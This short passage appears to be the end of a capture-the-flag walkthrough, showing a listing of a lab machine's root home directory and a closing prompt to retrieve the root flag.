drwx------  3 root root  4096 Jun 27 17:49 .gnupg
drwxr-xr-x  3 root root  4096 Oct  4 16:08 .local
-rw-------  1 root root   664 Sep 12 10:27 .mysql_history
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r-----  1 root root    38 Jun 27 17:30 root.txt
drwx------  2 root root  4096 Jun 27 17:45 .ssh
-rw-------  1 root root 10959 Oct 15 20:46 .viminfo 
```

> Finish the job and give me the root flag!